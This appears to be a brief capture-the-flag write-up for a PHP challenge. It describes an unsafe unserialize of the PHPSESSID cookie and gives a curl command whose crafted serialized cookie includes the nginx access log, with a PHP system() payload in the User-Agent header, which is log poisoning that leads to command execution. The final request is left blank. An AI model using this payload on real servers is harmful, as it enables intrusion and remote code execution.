- static website
- in the challenge we have this 2 php file
- ![My Image](img/11.png)
- ![My Image](img/22.png)
- the code checks if the PHP session ID ($_COOKIE['PHPSESSID']) is empty. If it is empty, it creates a new instance of the PageModel class, sets the file property to **'/www/index.html'**, and serializes the instance using serialize(). Then it encodes the serialized object with base64 encoding and sets it as a cookie named 'PHPSESSID'.
- Finally, the code attempts to retrieve and **unserialize** the 'PHPSESSID' cookie value.
- so i craft a cookie **PHPSESSID** with a path /var/log/nginx/access.log to see the nginx logs
```
curl -b "PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==" http://46.101.78.65:30584/ -A "<?php system('ls /'); ?>"
```
- with this request i get this output and as you can see there is a file named flag_****
- 
- so i send this request to get the content of the file
- 
